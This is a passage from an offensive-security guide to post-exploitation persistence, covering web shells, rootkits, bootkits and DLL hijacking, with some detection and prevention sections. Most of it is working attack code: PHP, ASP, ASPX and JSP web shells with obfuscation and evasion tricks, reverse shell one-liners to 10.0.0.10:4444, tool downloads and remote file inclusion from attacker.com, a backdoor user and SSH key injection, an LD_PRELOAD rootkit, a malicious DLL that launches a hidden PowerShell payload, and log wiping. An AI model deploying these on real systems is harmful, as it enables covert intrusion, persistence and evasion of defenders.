systemctl daemon-reload
systemctl enable system-update.service
systemctl start system-update.service
```

---

## Important Subtopics for Further Study

- **Rootkit Installation** - Kernel-level persistence mechanisms
- **Library Injection (LD_PRELOAD)** - Dynamic library hijacking for persistence
- **PAM Backdooring** - Pluggable Authentication Module manipulation
- **Boot Sector/GRUB Modification** - Pre-OS persistence techniques
- **Container Escape and Host Persistence** - Persistence in containerized environments

---

## Web Shell Deployment

Web shells are malicious scripts uploaded to web servers that provide remote command execution through HTTP/HTTPS requests. They persist as long as the web application remains accessible and the files remain undetected.

### PHP Web Shells

**Basic PHP Command Shell**

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

Executes commands passed via GET/POST parameter `cmd`. Access: `http://target.com/shell.php?cmd=whoami`

**PHP Shell with Authentication**

```php
<?php
$password = "secretpass123";
if(isset($_POST['pass']) && $_POST['pass'] == $password){
    if(isset($_POST['cmd'])){
        echo "<pre>";
        system($_POST['cmd']);
        echo "</pre>";
    }
}
?>
```

Requires password authentication before command execution. Reduces risk of accidental discovery or exploitation by other attackers.

**PHP File Upload Shell**

```php
<?php
if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "Uploaded: " . $_FILES['file']['name'];
}
?>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="file">
<input type="submit" value="Upload">
</form>
```

Allows arbitrary file uploads to the web server, enabling further tool deployment.

**Obfuscated PHP Shell**

```php
<?php
@eval($_POST['x']);
?>
```

Minimal footprint shell using `eval()` to execute POST data. Difficult to detect via simple file scanning.

**Base64 Encoded Shell**

```php
<?php
$a = base64_decode("c3lzdGVt");  // "system"
$b = $_REQUEST['c'];
$a($b);
?>
```

Obfuscates function names to evade signature-based detection.

**Encrypted PHP Shell**

```php
<?php
$key = "encryption_key";
$data = $_POST['data'];
$decrypted = openssl_decrypt(base64_decode($data), 'AES-256-CBC', $key, 0, substr(md5($key),0,16));
eval($decrypted);
?>
```

Commands are encrypted client-side before transmission, preventing IDS/IPS detection of command content.

### ASP/ASPX Web Shells

**Basic ASP Shell**

```asp
<%
Dim cmd
cmd = Request.QueryString("cmd")
Set objShell = Server.CreateObject("WScript.Shell")
Set objExec = objShell.Exec(cmd)
Response.Write("<pre>")
Response.Write(objExec.StdOut.ReadAll())
Response.Write("</pre>")
%>
```

Uses `WScript.Shell` to execute commands on Windows IIS servers.

**ASPX Shell**

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e){
    if(Request["cmd"] != null){
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request["cmd"];
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
```

C# based ASPX shell for .NET applications.

### JSP Web Shells

**Basic JSP Shell**

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
InputStream in = p.getInputStream();
BufferedReader reader = new BufferedReader(new InputStreamReader(in));
String line;
while((line = reader.readLine()) != null){
    out.println(line + "<br>");
}
%>
```

Executes commands on Java application servers (Tomcat, JBoss, WebLogic).

### Common Web Shell Frameworks

**China Chopper**

```php
<?php @eval($_POST['password']);?>
```

Extremely small (4 bytes of actual code) but requires client application. Popular APT-associated web shell. Client provides file management, database operations, and command execution through the minimal server component.

**WSO (Web Shell by Orb)** Full-featured PHP shell with file manager, SQL client, network tools, and brute force capabilities. Large file size makes it easier to detect but provides comprehensive post-exploitation functionality.

**C99 Shell**

```php
// Large multi-featured PHP shell
// Includes: file operations, SQL queries, port scanning, brute force, network tools
```

Classic PHP shell with extensive built-in tools. Commonly detected by security software due to widespread use.

**B374K Shell** Password-protected PHP shell with file manager, database client, and command execution. Uses encryption for client-server communication.

**Weevely**

```bash
# Generate encrypted PHP shell
weevely generate password /var/www/html/config.php

# Connect to deployed shell
weevely http://target.com/config.php password
```

Generates polymorphic, encrypted PHP shells. Client provides over 30 post-exploitation modules. Each generated shell has unique signature, evading static detection.

**Command Usage**

```bash
weevely generate mypass shell.php
weevely http://target.com/shell.php mypass
:file_upload /local/file /remote/path
:system_info
:backdoor_reversetcp 10.0.0.10 4444
```

**AntSword (èšå‰‘)** Chinese web shell management framework supporting PHP, ASP, ASPX, JSP. Provides GUI interface for managing multiple shells. Includes plugin system for extended functionality.

### Web Shell Deployment Methods

**Exploiting File Upload Vulnerabilities**

```bash
# Upload shell with double extension
shell.php.jpg
shell.jpg.php

# Upload with null byte injection (older PHP versions)
shell.php%00.jpg

# Upload with content-type manipulation
Content-Type: image/jpeg
(PHP shell code with JPEG header)

# Upload via ZIP archive
zip -r archive.zip shell.php
# Application extracts archive, deploying shell
```

**Exploiting LFI/RFI**

```bash
# Local File Inclusion to web shell via log poisoning
# Inject PHP into log file
nc target.com 80
<?php system($_GET['cmd']); ?>

# Include poisoned log
http://target.com/index.php?page=/var/log/apache2/access.log&cmd=whoami

# Remote File Inclusion
http://target.com/index.php?page=http://attacker.com/shell.php
```

**Exploiting SQL Injection**

```sql
-- MySQL INTO OUTFILE
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' -- -

-- MSSQL xp_cmdshell to write file
'; EXEC xp_cmdshell 'echo ^<?php system($_GET[cmd]); ?^> > C:\inetpub\wwwroot\shell.php' --
```

**Exploiting Insecure File Permissions**

```bash
# If web directory is world-writable
curl -X PUT -d '<?php system($_GET["cmd"]); ?>' http://target.com/shell.php

# Via WebDAV if enabled
cadaver http://target.com/
put shell.php
```

### Web Shell Obfuscation Techniques

**Variable Function Execution**

```php
<?php
$f = 'system';
$c = $_GET['c'];
$f($c);
?>
```

Avoids direct use of dangerous function names.

**String Concatenation**

```php
<?php
$a = 'sys';
$b = 'tem';
$func = $a.$b;
$func($_GET['c']);
?>
```

**Character Code Manipulation**

```php
<?php
$f = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);  // "system"
$f($_GET['c']);
?>
```

**Whitespace and Comment Injection**

```php
<?php
$_/*comment*/GET/*comment*/['cmd']/*comment*/;
s/**/y/**/s/**/t/**/e/**/m($_GET['cmd']);
?>
```

**Using Assert Instead of Eval**

```php
<?php
assert($_POST['x']);
?>
```

`assert()` executes code like `eval()` but is less commonly detected.

**Callback Functions**

```php
<?php
array_map("assert", (array)$_POST['x']);
?>
```

Uses legitimate PHP functions as code execution vectors.

### Web Shell Detection Evasion

**Timestomping Web Shells**

```bash
# Match timestamps to legitimate files
touch -r /var/www/html/index.php /var/www/html/shell.php
```

Makes web shell appear as old as legitimate files, evading modification time-based detection.

**Hiding in Common File Locations**

```bash
# Deploy as configuration files
/var/www/html/config.php
/var/www/html/includes/database.php
/var/www/html/.htaccess (if PHP execution allowed)

# Deploy in common library directories
/var/www/html/vendor/autoload.php
/var/www/html/lib/functions.php
```

**Using Polyglot Files**

```php
GIF89a<?php system($_GET['cmd']); ?>
```

File appears as valid GIF image but executes as PHP. Bypasses simple file type validation.

**Conditional Execution**

```php
<?php
// Only execute if specific User-Agent present
if($_SERVER['HTTP_USER_AGENT'] == 'CustomUserAgent'){
    system($_GET['cmd']);
}
?>
```

Shell only responds to requests with specific headers, appearing broken to casual inspection.

**Cookie-Based Authentication**

```php
<?php
if($_COOKIE['auth'] == md5('secretpass')){
    system($_GET['cmd']);
}
?>
```

Requires specific cookie value, preventing accidental discovery.

### Web Shell Access Methods

**Direct HTTP Access**

```bash
curl "http://target.com/shell.php?cmd=whoami"
curl -X POST -d "cmd=ls -la" http://target.com/shell.php
```

**Through Burp Suite/ZAP** Provides request modification, encoding, and session management for complex web shells.

**Using Custom Python Scripts**

```python
import requests

url = "http://target.com/shell.php"
cmd = "whoami"

response = requests.post(url, data={'cmd': cmd})
print(response.text)
```

**Weevely Terminal**

```bash
weevely http://target.com/shell.php password
# Interactive terminal with tab completion
```

### Web Shell Post-Exploitation

**Upgrading to Reverse Shell**

```bash
# Via web shell
http://target.com/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.0.0.10/4444 0>&1'

# PHP reverse shell
http://target.com/shell.php?cmd=php -r '$s=fsockopen("10.0.0.10",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

**Establishing Persistence Beyond Web Shell**

```bash
# Add SSH key
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# Create cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/4444 0>&1'" | crontab -

# Add user account
useradd -m -s /bin/bash backdoor && echo "backdoor:password" | chpasswd
```

**Downloading Additional Tools**

```bash
# Via web shell
wget http://attacker.com/tool -O /tmp/tool
curl http://attacker.com/tool -o /tmp/tool
```

## Rootkit Installation

Rootkits are sophisticated malware designed to maintain privileged access while hiding their presence from system administrators and security software. They operate at various privilege levels, from userland to kernel space, with kernel rootkits providing the deepest system control.

### Linux Userland Rootkits

Userland rootkits operate without kernel modifications, replacing system binaries or using LD_PRELOAD to intercept library calls.

**LD_PRELOAD Rootkit Basics**

```c
// rootkit.c - Simple LD_PRELOAD rootkit
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

static int (*original_readdir)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    
    struct dirent *dir;
    while ((dir = original_readdir(dirp)) != NULL) {
        // Hide files containing "rootkit"
        if (strstr(dir->d_name, "rootkit") == NULL) {
            break;
        }
    }
    return dir;
}
```

**Compiling LD_PRELOAD Rootkit**

```bash
gcc -shared -fPIC rootkit.c -o rootkit.so -ldl
```

**Deploying LD_PRELOAD Rootkit**

```bash
# System-wide persistence
echo "/path/to/rootkit.so" >> /etc/ld.so.preload

# Per-user persistence
echo "export LD_PRELOAD=/path/to/rootkit.so" >> ~/.bashrc
```

**Jynx2 Rootkit** LD_PRELOAD based rootkit that hides files, processes, and network connections. Intercepts libc functions like `readdir()`, `stat()`, and `open()`.

```bash
# Installation
git clone https://github.com/chokepoint/Jynx2
cd Jynx2
make
./install.sh
```

**Azazel Rootkit** Userland rootkit using LD_PRELOAD with PAM backdoor capabilities.

```bash
# Clone and compile
git clone https://github.com/chokepoint/azazel
cd azazel
./configure
make
```

**Features**: Hides files, processes, network connections; provides PAM backdoor; logs credentials.

### Linux Kernel Rootkits

Kernel rootkits operate at ring 0, providing complete system control and deep hiding capabilities. They modify kernel memory structures and system call tables.

**Loadable Kernel Module (LKM) Basics**

```c
// simple_rootkit.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Attacker");
MODULE_DESCRIPTION("Simple LKM Rootkit");

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit loaded\n");
    return 0;
}

static void __exit rootkit_cleanup(void) {
    printk(KERN_INFO "Rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_cleanup);
```

**Compiling Kernel Module**

```makefile
# Makefile
obj-m += simple_rootkit.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

```bash
make
insmod simple_rootkit.ko
lsmod | grep simple_rootkit
rmmod simple_rootkit
```

**Diamorphine Rootkit** Open-source LKM rootkit for Linux that provides root access, process hiding, and module concealment.

```bash
# Clone and compile
git clone https://github.com/m0nad/Diamorphine
cd Diamorphine
make

# Load module
insmod diamorphine.ko
```

**Key Features**:

- Grants root privileges by sending signal 63 to any process
- Hides processes by sending signal 31
- Hides itself from `lsmod`
- Hides files with specific prefix

**Usage Examples**

```bash
# Grant root to current shell
kill -63 $$

# Hide process with PID 1234
kill -31 1234

# Show hidden process
kill -31 1234

# Hide files (create with magic prefix)
touch PREFIX_hidden_file
```

**Reptile Rootkit** Advanced LKM rootkit with reverse shell, file hiding, and port knocking capabilities.

```bash
git clone https://github.com/f0rb1dd3n/Reptile
cd Reptile
make menuconfig  # Configure options
make
make install
```

**Features**:

- Reverse TCP/UDP shells
- Port knocking activation
- File, process, and network connection hiding
- Module hiding
- Privilege escalation

**Suterusu Rootkit** LKM rootkit with focus on stealth and persistence.

```bash
git clone https://github.com/mncoppola/suterusu
cd suterusu
make
insmod suterusu.ko
```

**Process Hiding via Task List Manipulation**

```c
// Kernel rootkits hide processes by removing from task list
struct task_struct *task;
for_each_process(task) {
    if (task->pid == target_pid) {
        list_del(&task->tasks);  // Remove from process list
    }
}
```

[Inference: This code pattern shows conceptual approach to process hiding but actual implementation requires additional handling of task structure references and proper locking mechanisms.]

**File Hiding via VFS Hooking**

```c
// Hook getdents64 system call to hide files
asmlinkage long hook_getdents64(unsigned int fd, 
                                struct linux_dirent64 __user *dirp,
                                unsigned int count) {
    // Call original getdents64
    long ret = orig_getdents64(fd, dirp, count);
    
    // Filter out files matching hiding pattern
    // (implementation details omitted)
    
    return ret;
}
```

[Inference: Modern kernels with KPTI and other protections make system call hooking more complex than historical approaches.]

### Kernel Rootkit Detection Evasion

**Hiding from lsmod**

```c
// Remove module from kernel module list
list_del(&__this_module.list);
```

**Hiding from /sys/module**

```c
// Remove sysfs entry
kobject_del(&THIS_MODULE->mkobj.kobj);
```

**Anti-Forensics Techniques**

```bash
# Disable kernel logging
dmesg -n 1

# Clear logs after module load
echo "" > /var/log/kern.log
```

### Windows Rootkits

**User-Mode Rootkits (Ring 3)**

User-mode rootkits hook Windows API functions or inject DLLs into processes.

**IAT Hooking** Import Address Table (IAT) hooking redirects Windows API calls by modifying the import table of a loaded module.

```c
// IAT Hook example structure
DWORD OriginalFunction;

DWORD HookedFunction(/* parameters */) {
    // Malicious code here
    
    // Call original function
    return ((DWORD(*)())OriginalFunction)(/* parameters */);
}

// Modify IAT entry
*(DWORD*)IATEntry = (DWORD)HookedFunction;
```

**Inline Hooking** Modifies the first bytes of a function to jump to malicious code.

```assembly
; Original function prologue
push ebp
mov ebp, esp

; Replaced with jump to hook
jmp HookFunction
```

**Hacker Defender** Classic Windows usermode rootkit (deprecated but educational). Hooked Windows APIs to hide files, processes, registry keys, and network connections.

[Unverified: Hacker Defender has not been maintained since Windows XP era and is unlikely to function on modern Windows versions with driver signing requirements and security enhancements.]

**Kernel-Mode Rootkits (Ring 0)**

**SSDT Hooking** System Service Descriptor Table (SSDT) hooking redirects system calls by modifying the SSDT.

```c
// Simplified SSDT hook structure
typedef struct _SYSTEM_SERVICE_TABLE {
    PVOID *ServiceTableBase;
    PVOID *ServiceCounterTable;
    ULONG NumberOfServices;
    PVOID *ParamTableBase;
} SYSTEM_SERVICE_TABLE;

// Hook system call
ServiceTableBase[syscall_index] = (PVOID)HookedFunction;
```

[Unverified: SSDT hooking is prevented by PatchGuard (Kernel Patch Protection) on modern 64-bit Windows systems. Bypasses exist but are complex and version-specific.]

**IRP Hooking** I/O Request Packet (IRP) hooking intercepts kernel-level I/O operations.

```c
// Hook driver's IRP dispatch function
OriginalDispatch = DriverObject->MajorFunction[IRP_MJ_CREATE];
DriverObject->MajorFunction[IRP_MJ_CREATE] = HookedDispatch;
```

**DKOM (Direct Kernel Object Manipulation)** Modifies kernel structures directly rather than hooking functions.

```c
// Hide process via EPROCESS list unlinking
// Remove process from ActiveProcessLinks
process->ActiveProcessLinks.Flink->Blink = process->ActiveProcessLinks.Blink;
process->ActiveProcessLinks.Blink->Flink = process->ActiveProcessLinks.Flink;
```

**ZeroAccess Rootkit** Real-world rootkit that used DKOM and kernel-mode components. Created hidden file systems and network channels.

[Unverified: ZeroAccess analysis is based on reverse engineering of historical samples and may not reflect all variants or capabilities.]

### Rootkit Detection Tools

**Linux Rootkit Detection**

**chkrootkit**

```bash
apt install chkrootkit
chkrootkit

# Specific tests
chkrootkit -x  # Expert mode
chkrootkit -q  # Quiet mode
```

Checks for known rootkit signatures, suspicious files, and modified binaries.

**rkhunter (Rootkit Hunter)**

```bash
apt install rkhunter
rkhunter --update
rkhunter --check
rkhunter --propupd  # Update file property database
```

Scans for rootkits, backdoors, and local exploits. Compares file hashes against known-good values.

**OSSEC** Host-based intrusion detection that monitors file integrity, rootkit signatures, and system anomalies.

**Detecting LD_PRELOAD Rootkits**

```bash
# Check for ld.so.preload
cat /etc/ld.so.preload

# Check for LD_PRELOAD in environment
env | grep LD_PRELOAD

# Verify system binaries
debsums -ca  # Debian/Ubuntu
rpm -Va      # RedHat/CentOS
```

**Detecting LKM Rootkits**

```bash
# List loaded modules
lsmod
cat /proc/modules

# Compare against sysfs
diff <(lsmod | cut -d' ' -f1 | tail -n +2 | sort) <(ls /sys/module | sort)

# Check for hidden modules
unhide-linux proc
unhide-linux sys
```

**Memory Analysis with Volatility**

```bash
# Dump memory
insmod lime.ko "path=/tmp/memory.lime format=lime"

# Analyze with Volatility
volatility -f memory.lime --profile=LinuxUbuntu2004x64 linux_pslist
volatility -f memory.lime --profile=LinuxUbuntu2004x64 linux_lsmod
volatility -f memory.lime --profile=LinuxUbuntu2004x64 linux_hidden_modules
```

**Windows Rootkit Detection**

**GMER** Detects rootkits via SSDT hooks, hidden processes, hidden files, and hidden registry keys. Provides GUI interface for Windows rootkit analysis.

**Rootkit Revealer (Sysinternals)** Compares high-level API results with low-level queries to identify discrepancies indicating rootkit presence.

[Unverified: Rootkit Revealer is outdated and may not function correctly on Windows 10/11.]

**PCHunter** Advanced Windows system inspection tool that displays SSDT hooks, IDT hooks, driver objects, and kernel modules.

**IceSword** Chinese security tool for rootkit detection and system analysis. Provides deep inspection of Windows internals.

### Rootkit Prevention

**Linux Prevention Measures**

**Kernel Module Signing**

```bash
# Enable module signature verification in kernel config
CONFIG_MODULE_SIG=y
CONFIG_MODULE_SIG_FORCE=y

# Prevent unsigned module loading
echo "1" > /proc/sys/kernel/modules_disabled
```

**Immutable Attributes**

```bash
# Make critical files immutable
chattr +i /bin/bash
chattr +i /usr/bin/sudo
chattr +i /etc/ld.so.preload

# View attributes
lsattr /bin/bash
```

**File Integrity Monitoring**

```bash
# AIDE (Advanced Intrusion Detection Environment)
apt install aide
aideinit
cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db
aide --check
```

**Windows Prevention Measures**

**Driver Signature Enforcement** Windows requires signed drivers on 64-bit systems. Attackers must bypass signature enforcement or steal valid certificates.

**Early Launch Anti-Malware (ELAM)** Allows anti-malware drivers to load before other boot-start drivers, providing early rootkit detection.

**Credential Guard and Device Guard** Virtualization-based security features that protect against rootkits accessing credential material or executing unsigned code.

## Bootkit Techniques

Bootkits are sophisticated malware that infects the boot process, loading before the operating system and maintaining persistence even after OS reinstallation. They achieve the highest level of persistence by targeting firmware, bootloaders, or Master Boot Record (MBR).

### MBR Bootkits

Master Boot Record bootkits modify the MBR to load malicious code before the operating system's bootloader.

**MBR Structure**

```
Offset   Size   Description
0x000    446    Bootstrap code
0x1BE    64     Partition table (4 entries Ã— 16 bytes)
0x1FE    2      Boot signature (0x55 0xAA)
```

**Reading MBR (Linux)**

```bash
dd if=/dev/sda of=mbr.bin bs=512 count=1
hexdump -C mbr.bin
```

**Reading MBR (Windows)**

```bash
# Requires administrative privileges
dd if=\\.\PhysicalDrive0 of=mbr.bin bs=512 count=1
```

**Basic MBR Infection Technique**

```assembly
; Simplified MBR bootkit pseudocode
org 0x7C00          ; BIOS loads MBR to 0x7C00

; Save original MBR
mov si, 0x7C00
mov di, 0x8000
mov cx, 512
rep movsb

; Execute malicious payload
call malicious_payload

; Jump to original MBR
jmp 0x8000

malicious_payload:
    ; Hook INT 13h (disk I/O)
    ; Install payload in memory
    ; Return to caller
    ret

times 510-($-$$) db 0
dw 0xAA55           ; Boot signature
```

**Mebroot/Sinowal** Real-world MBR bootkit that infected Windows systems. Hooked disk I/O to hide its presence and load kernel-mode components.

[Unverified: Mebroot was primarily active 2007-2011 and specific technical details are based on malware analysis reports from that period.]

**TDL4/TDSS** Sophisticated MBR bootkit that implemented its own file system and network stack in the boot sector code.

**Infection Process**:

1. Drops bootkit driver
2. Backs up original MBR
3. Writes bootkit code to MBR
4. Stores original MBR and additional bootkit components in hidden sectors
5. Reboots system

### VBR (Volume Boot Record) Bootkits

VBR bootkits modify the Volume Boot Record of a partition rather than the MBR, making them stealthier.

**VBR Location**

```bash
# First sector of partition
dd if=/dev/sda1 of=vbr.bin bs=512 count=1
```

**Rovnix Bootkit** Infected VBR instead of MBR, making detection more difficult. Used sophisticated techniques to hide from security software.

### UEFI Bootkits

UEFI (Unified Extensible Firmware Interface) bootkits target modern systems that use UEFI instead of legacy BIOS.

**UEFI Boot Process**

1. System firmware (UEFI)
2. Boot Manager
3. EFI application (bootloader)
4. Operating system

**EFI System Partition (ESP)**

```bash
# Mount ESP (Linux)
mount /dev/sda1 /mnt/efi

# Typical ESP structure
/EFI/Boot/bootx64.efi      # Default bootloader
/EFI/Microsoft/Boot/       # Windows Boot Manager
/EFI/ubuntu/grubx64.efi    # GRUB bootloader
```

**LoJax UEFI Rootkit** First publicly documented UEFI rootkit in the wild. Infected system firmware, persisting across OS reinstalls and hard drive replacements.

**Infection Technique**:

1. Exploits vulnerable firmware update mechanisms
2. Modifies UEFI firmware image
3. Installs malicious UEFI module
4. Module loads during boot, before OS

[Unverified: LoJax was attributed to APT28 (Fancy Bear) based on threat intelligence reporting, but attribution is inherently difficult to verify with certainty.]

**MosaicRegressor** UEFI firmware rootkit that deployed additional malware payloads during system boot.

**ESP Bootkit (Simpler Approach)**

```bash
# Instead of modifying firmware, replace bootloader
cp /EFI/Boot/bootx64.efi /EFI/Boot/bootx64.efi.original
cp malicious_bootloader.efi /EFI/Boot/bootx64.efi
```

Malicious bootloader loads legitimate bootloader after executing malicious code. Easier to implement than firmware modification but less persistent.

### Firmware-Level Persistence

**BIOS/UEFI Firmware Modification**

Direct firmware modification provides highest persistence level but requires:

- Vulnerable firmware update mechanisms
- Physical access or exploit with sufficient privileges
- Platform-specific knowledge

**SPI Flash Access**

```bash
# flashrom - utility for reading/writing firmware
flashrom -p internal -r backup.bin  # Read current firmware
flashrom -p internal -w modified.bin  # Write modified firmware
```

[Unverified: Modern systems often have firmware write protections that prevent unauthorized modification without physical access to disable protection mechanisms.]

**Intel Management Engine (ME) Exploitation**

Intel ME runs independently of the main CPU and OS, providing a potential persistence vector.

[Inference: ME exploitation is extremely complex and typically requires sophisticated techniques such as those demonstrated in research presentations like "How to Hack a Turned-Off Computer" (Black Hat 2018), but specific exploitation details are not publicly documented for operational security reasons.]

### Bootkit Detection

**MBR/VBR Analysis**

```bash
# Compare MBR against known-good signature
dd if=/dev/sda of=mbr.bin bs=512 count=1
md5sum mbr.bin

# Analyze MBR with GMER (Windows)
# Use GUI to scan MBR

# Linux: Check for MBR modifications
dd if=/dev/sda bs=512 count=1 | xxd
```

**UEFI Firmware Analysis**

```bash
# Dump UEFI firmware
flashrom -p internal -r firmware.bin

# Analyze with UEFITool
UEFITool firmware.bin

# Extract and examine modules
UEFIExtract firmware.bin
````

**CHIPSEC Framework**
```bash
# Install CHIPSEC
pip install chipsec

# Check for UEFI vulnerabilities
sudo chipsec_main

# Specific security checks
sudo chipsec_main -m common.bios_wp  # BIOS write protection
sudo chipsec_main -m common.smm      # SMM security
sudo chipsec_main -m common.uefi.access_uefispec  # UEFI variable security
````

**Bootkit Detection Tools**

**GMER (Windows)** Scans MBR, boot sectors, and BIOS for rootkit presence. Provides GUI for system inspection.

**TDSSKiller (Kaspersky)** Specialized tool for detecting and removing MBR/bootkit infections, particularly TDL family.

```bash
# Download and run
TDSSKiller.exe
# Follow GUI prompts to scan and clean
```

**Bitdefender Rescue CD** Bootable rescue environment that scans for bootkits before OS loads, preventing bootkit from hiding itself.

**Memtest86+ with UEFI Secure Boot** Validates boot chain integrity through Secure Boot verification.

### Bootkit Prevention

**Secure Boot (UEFI)**

```bash
# Check Secure Boot status (Linux)
mokutil --sb-state

# Check Secure Boot status (Windows)
Confirm-SecureBootUEFI
```

Secure Boot verifies cryptographic signatures of boot components, preventing unsigned bootkit code from executing.

**Measured Boot / Trusted Boot** Uses TPM (Trusted Platform Module) to measure boot components and detect tampering.

```bash
# Check TPM status
tpm_version

# View PCR (Platform Configuration Register) values
tpm_pcrread
```

**BIOS/UEFI Password Protection**

```
# Set in BIOS/UEFI firmware settings
- Administrator password
- Boot password
- Disable firmware update without authentication
```

**Write Protection for SPI Flash**

```bash
# Hardware write protection prevents firmware modification
# Enable in BIOS settings or via physical jumper (platform-specific)
```

**Boot Integrity Verification**

```bash
# Windows: Boot Configuration Data (BCD) integrity
bcdedit /enum {bootmgr}

# Linux: GRUB configuration integrity
debsums grub-common
```

## DLL Persistence

DLL (Dynamic Link Library) persistence techniques exploit Windows' dynamic linking mechanisms to maintain access by injecting malicious DLLs into legitimate processes or configuring automatic DLL loading during system or application startup.

### DLL Hijacking

DLL hijacking exploits the Windows DLL search order to load malicious DLLs instead of legitimate ones.

**Windows DLL Search Order**

1. Directory of the application
2. System directory (`C:\Windows\System32`)
3. 16-bit system directory (`C:\Windows\System`)
4. Windows directory (`C:\Windows`)
5. Current directory
6. Directories in PATH environment variable

**Basic DLL Hijacking**

```c
// malicious.dll - Simple DLL that executes payload
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch(fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Execute payload when DLL loads
            WinExec("cmd.exe /c powershell -w hidden -enc <base64_payload>", SW_HIDE);
            break;
    }
    return TRUE;
}
```

**Compiling DLL**

```bash
# Using MinGW
x86_64-w64-mingw32-gcc -shared -o malicious.dll malicious.c

# Using Visual Studio
cl /LD malicious.c
```

**Identifying Hijackable DLLs**

**Process Monitor (Procmon)**

```
1. Run Procmon from Sysinternals
2. Set filter: Result is "NAME NOT FOUND"
3. Set filter: Path ends with ".dll"
4. Launch target application
5. Identify missing DLLs loaded from writable locations
```

**PowerSploit - Find-ProcessDLLHijack**

```powershell
Import-Module PowerSploit
Find-ProcessDLLHijack

# For specific process
Find-ProcessDLLHijack -Name "vulnerable_app.exe"
```

**DLL Hijacking via Phantom DLL**

```
1. Identify missing DLL in search path
   Example: Application looks for "version.dll" in application directory
2. Create malicious version.dll
3. Place in application directory (higher priority than System32)
4. Application loads malicious DLL at startup
```

**Common Hijackable DLLs**

- `dwmapi.dll` - Desktop Window Manager API
- `cryptsp.dll` - Cryptographic Service Provider
- `version.dll` - Version checking
- `wlanapi.dll` - Wireless LAN API
- `dxgi.dll` - DirectX Graphics Infrastructure

**DLL Proxying/Forwarding** When hijacking a required DLL, forward legitimate function calls to the real DLL while executing malicious code.

```c
// malicious_version.dll
#include <windows.h>

// Forward declarations
#pragma comment(linker, "/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA,@1")
#pragma comment(linker, "/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.GetFileVersionInfoW,@2")
// ... forward other exports

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if(fdwReason == DLL_PROCESS_ATTACH) {
        // Malicious code executes
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MaliciousFunction, NULL, 0, NULL);
    }
    return TRUE;
}

void MaliciousFunction() {
    // Persistence, C2 communication, etc.
}
```

### DLL Side-Loading

DLL side-loading places a malicious DLL alongside a legitimate, signed application that loads it, bypassing application whitelisting.

**Process**

```
1. Find legitimate signed application that loads DLL from its directory
2. Create malicious DLL with expected name
3. Place application + malicious DLL in writable location
4. Execute legitimate application
5. Application loads malicious DLL (appears as legitimate signed process)
```

**Common Side-Loading Targets**

- Microsoft applications (older versions)
- Third-party software with weak DLL loading
- Applications using outdated dependencies

**Example: GUP.exe (Notepad++ updater)**

```
GUP.exe (legitimate Notepad++ component) loads libcurl.dll from same directory
1. Copy GUP.exe to C:\Temp\
2. Create malicious libcurl.dll
3. Place in C:\Temp\
4. Execute GUP.exe â†’ loads malicious libcurl.dll
```

### AppInit_DLLs Persistence

AppInit_DLLs registry key causes DLLs to load into every process that loads `user32.dll` (most GUI applications).

**Registry Location**

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs (32-bit on 64-bit)
```

**Setting AppInit_DLLs**

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\malicious.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
```

**PowerShell Method**

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs" -Value "C:\malicious.dll"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "LoadAppInit_DLLs" -Value 1
```

**Limitations** [Unverified: Modern Windows versions (8+) with Secure Boot enabled do not load unsigned AppInit_DLLs. The feature also requires administrator privileges to configure and generates obvious registry artifacts.]

### DLL Search Order Hijacking

**Exploiting Current Directory** Many applications search the current directory for DLLs. Placing a malicious DLL in a user-writable directory and launching an application from that directory can trigger DLL hijacking.

```cmd
# Place malicious.dll in C:\Users\Public\
